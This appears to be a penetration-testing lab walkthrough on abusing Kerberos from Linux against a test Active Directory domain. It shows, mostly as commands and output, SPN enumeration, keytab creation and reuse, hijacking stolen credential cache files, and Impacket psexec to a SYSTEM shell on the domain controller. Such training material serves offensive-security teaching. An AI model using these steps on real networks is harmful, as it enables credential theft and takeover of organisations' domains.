Kerberos uses the same underlying technology on Linux as it does on Windows, but it does behave differently in some respects.

Active Directory members using Kerberos authentication are assigned a credential cache file to contain their requested Kerberos tickets. The file’s location is set through the user’s `KRB5CCNAME` environment variable.
```bash
administrator@corp1.com@linuxvictim:~$ env | grep KRB5CCNAME
KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5
```

Kerberos tickets expire after a period of time.

We will use the `kinit` command, which is used to acquire a Kerberos ticket-granting ticket (TGT) for the current user. To request a TGT, we just need to call kinit without parameters and enter the user’s AD password.
```bash
administrator@corp1.com@linuxvictim:~$ kinit
Password for Administrator@CORP1.COM:
```

The `klist` command is used to list tickets currently stored in the user’s credential cache file.
```bash
administrator@corp1.com@linuxvictim:~$ klist
Ticket cache: FILE:/tmp/krb5cc_607000500_wSiMnP
Default principal: Administrator@CORP1.COM
Valid starting Expires Service principal
05/18/2020 15:12:38 05/19/2020 01:12:38 krbtgt/CORP1.COM@CORP1.COM
renew until 05/25/2020 15:12:36
```

We can now access Kerberos services as the domain administrator. We can get a list of available Service Principal Names (SPN) from the domain controller using ldapsearch with the -Y GSSAPI parameter to force it to use Kerberos authentication. It may ask for an LDAP password, but if we just hit enter at the prompt, it will continue and use Kerberos for authentication.
```bash
administrator@corp1.com@linuxvictim:~$ ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
Enter LDAP Password:
SASL/GSSAPI authentication started
SASL username: Administrator@CORP1.COM
...
# DC01, Domain Controllers, corp1.com
dn: CN=DC01,OU=Domain Controllers,DC=corp1,DC=com
servicePrincipalName: TERMSRV/DC01
servicePrincipalName: TERMSRV/DC01.corp1.com
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.corp1.com
servicePrincipalName: ldap/DC01.corp1.com/ForestDnsZones.corp1.com
servicePrincipalName: ldap/DC01.corp1.com/DomainDnsZones.corp1.com
servicePrincipalName: DNS/DC01.corp1.com
servicePrincipalName: GC/DC01.corp1.com/corp1.com
servicePrincipalName: RestrictedKrbHost/DC01.corp1.com
servicePrincipalName: RestrictedKrbHost/DC01
servicePrincipalName: RPC/8c186ffa-f4e6-4c8a-9ea9-67ca49c31abd._msdcs.corp1.co
m
...
# SQLSvc, Corp1ServiceAccounts, Corp1Users, corp1.com
dn: CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com
servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433
servicePrincipalName: MSSQLSvc/DC01.corp1.com:SQLEXPRESS
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:1433
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS
...
# numResponses: 10
# numEntries: 6
# numReferences: 3
```

Let’s request a service ticket from Kerberos for the MSSQL SPN highlighted above. We can do this using the kvno utility.
```bash
administrator@corp1.com@linuxvictim:/tmp$ kvno MSSQLSvc/DC01.corp1.com:1433
MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2
```

Our ticket should now be in our credential cache. We can use klist again to confirm it was successful.
```bash
administrator@corp1.com@linuxvictim:/tmp$ klist
Ticket cache: FILE:/tmp/krb5cc_607000500_3aeIA5
Default principal: Administrator@CORP1.COM
Valid starting Expires Service principal
07/30/2020 15:11:10 07/31/2020 01:11:10 krbtgt/CORP1.COM@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:41 07/31/2020 01:11:10 ldap/dc01.corp1.com@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:57 07/31/2020 01:11:10 MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
renew until 08/06/2020 15:11:08
```

# Stealing Keytab Files

Keytab files contain a Kerberos principal name and encrypted keys. These allow a user or script to authenticate to Kerberos resources elsewhere on the network on the principal’s behalf without entering a password.

Keytab files are commonly used in `cron` scripts when Kerberos authentication is needed to access certain resources.

We’ll run the `ktutil` command, which provides us with an interactive prompt. Then we use `addent` to add an entry to the keytab file for the administrator user and specify the encryption type with `-e`. The utility asks for the user’s password, which we provide. We then use `wkt` with a path to specify where the keytab file should be written. Finally, we can exit the utility with the `quit` command.
```bash
administrator@corp1.com@linuxvictim:~$ ktutil
ktutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
Password for administrator@CORP1.COM:
ktutil: wkt /tmp/administrator.keytab
ktutil: quit
```


Assuming we have gained root access to a machine with this keytab active, we can use it to gain access to other system on behalf of the user specified in the keytab file:
```bash
root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
```

Now we see the ticket loaded:
```bash
root@linuxvictim:~# klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@CORP1.COM
Valid starting Expires Service principal
07/30/2020 15:18:34 07/31/2020 01:18:34 krbtgt/CORP1.COM@CORP1.COM
renew until 08/06/2020 15:18:34
```

We can also reload expired tickets with `kinit -R`:
```bash
root@linuxvictim:~# kinit -R
```

Now that the keytab is loaded, we can use it to authenticate as the administrator:
```bash
root@linuxvictim:~# smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
$Recycle.Bin DHS 0 Sat Sep 15 03:19:00 2018
Documents and Settings DHS 0 Tue Jun 9 13:50:42 2020
pagefile.sys AHS 738197504 Fri Oct 2 11:25:15 2020
PerfLogs D 0 Mon Jun 15 15:04:37 2020
Program Files DR 0 Mon Jun 15 08:10:03 2020
Program Files (x86) D 0 Tue Jun 9 08:43:21 2020
ProgramData DH 0 Mon Jun 15 15:04:37 2020
Recovery DHS 0 Tue Jun 9 13:50:45 2020
SQL2019 D 0 Tue Jun 9 08:34:53 2020
System Volume Information DHS 0 Tue Jun 9 07:38:26 2020
Tools D 0 Mon Jun 15 08:09:24 2020
Users DR 0 Mon Jun 15 15:22:49 2020
Windows D 0 Mon Jun 15 15:04:45 2020
6395903 blocks of size 4096. 2185471 blocks available
```

# Attacking Using Credential Cache Files

The first scenario is quite simple. If we compromise an active user’s shell session, we can essentially act as the user in question and use their current Kerberos tickets. Gaining an initial TGT would require the user’s Active Directory password. However, if the user is already authenticated, we can just use their current tickets.

The second scenario is to authenticate by compromising a user’s ccache file. As we noted earlier, a user’s ccache file is stored in /tmp with a format like /tmp/krb5cc_. The file is typically only accessible by the owner. Because of this, it’s unlikely that we will be able to steal a user’s ccache file as an unprivileged user.

We can use the ticket as follows:
```bash
offsec@linuxvictim:~$ kdestroy

offsec@linuxvictim:~$ klist
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

offsec@linuxvictim:~$ export 
KRB5CCNAME=/tmp/krb5cc_minenow

offsec@linuxvictim:~$ klist
Ticket cache: FILE:/tmp/krb5cc_minenow
Default principal: Administrator@CORP1.COM
Valid starting Expires Service principal
07/30/2020 15:11:10 07/31/2020 01:11:10 krbtgt/CORP1.COM@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:41 07/31/2020 01:11:10 ldap/dc01.corp1.com@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:57 07/31/2020 01:11:10 MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
renew until 08/06/2020 15:11:08
offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433
MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2
offsec@linuxvictim:~$ klist
Ticket cache: FILE:/tmp/krb5cc_minenow
Default principal: Administrator@CORP1.COM
Valid starting Expires Service principal
07/30/2020 15:11:10 07/31/2020 01:11:10 krbtgt/CORP1.COM@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:41 07/31/2020 01:11:10 ldap/dc01.corp1.com@CORP1.COM
renew until 08/06/2020 15:11:08
07/30/2020 15:11:57 07/31/2020 01:11:10 MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
renew until 08/06/2020 15:11:08
```

# Using Kerberos with Impacket

If we have tickets injected in our local linux box, we can use Impacket alongside the `-k` flag to use them. We can examine the list of domain users with `GetADUsers.py`:
```bash
kali@kali:~$ proxychains python3 /usr/share/doc/python3-
impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5
CORP1.COM/Administrator
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
...
[*] Querying DC01 for information about domain.
Name Email PasswordLastSet LastLogon
-------------------- ------------------------------ ------------------- ----------- --------
Administrator 2020-06-09 07:07:34.259645
2020-07-30 15:18:34.031633
Guest <never> <never>
krbtgt 2020-06-09 07:22:08.937707
<never>
offsec 2020-06-15 07:34:58.841850
<never>
setup 2020-06-15 07:35:40.209134
2020-06-15 15:24:01.455022
sqlsvc 2020-06-15 07:37:26.049078
2020-07-08 09:21:43.005075
admin 2020-06-15 07:39:32.340987
2020-07-29 18:26:00.427117
jeff 2020-06-15 07:40:06.571361
2020-06-15 15:23:15.203875
dave 2020-06-15 07:40:59.512944
2020-07-30 09:27:53.384254
```

It’s also possible to get a list of the SPNs available to our Kerberos user:
```bash
kali@kali:~$ proxychains python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5
CORP1.COM/Administrator
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
...
ServicePrincipalName Name MemberOf
PasswordLastSet LastLogon Delegation
-------------------------------------- ------ --------------------------------------
------ -------------------------- -------------------------- ----------
MSSQLSvc/appsrv01.corp1.com:1433 sqlsvc
CN=Administrators,CN=Builtin,DC=corp1,DC=com 2020-06-15 07:37:26.049078 2020-07-08
09:21:43.005075
MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS sqlsvc
CN=Administrators,CN=Builtin,DC=corp1,DC=com 2020-06-15 07:37:26.049078 2020-07-08
09:21:43.005075
MSSQLSvc/dc01.corp1.com:1433 sqlsvc
CN=Administrators,CN=Builtin,DC=corp1,DC=com 2020-06-15 07:37:26.049078 2020-07-08
09:21:43.005075
MSSQLSvc/dc01.corp1.com:SQLEXPRESS sqlsvc
CN=Administrators,CN=Builtin,DC=corp1,DC=com 2020-06-15 07:37:26.049078 2020-07-08
09:21:43.005075
```

If we want to gain a shell on the server, we can then run psexec with the following command:
```bash
kali@kali:~$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py
Administrator@DC01.CORP1.COM -k -no-pass
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
...
[*] Requesting shares on DC01.CORP1.COM.....
[*] Found writable share ADMIN$
[*] Uploading file tDwixbpM.exe
[*] Opening SVCManager on DC01.CORP1.COM.....
[*] Creating service cEiR on DC01.CORP1.COM.....
[*] Starting service cEiR.....
...
[!] Press help for extra shell commands
...
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32>
```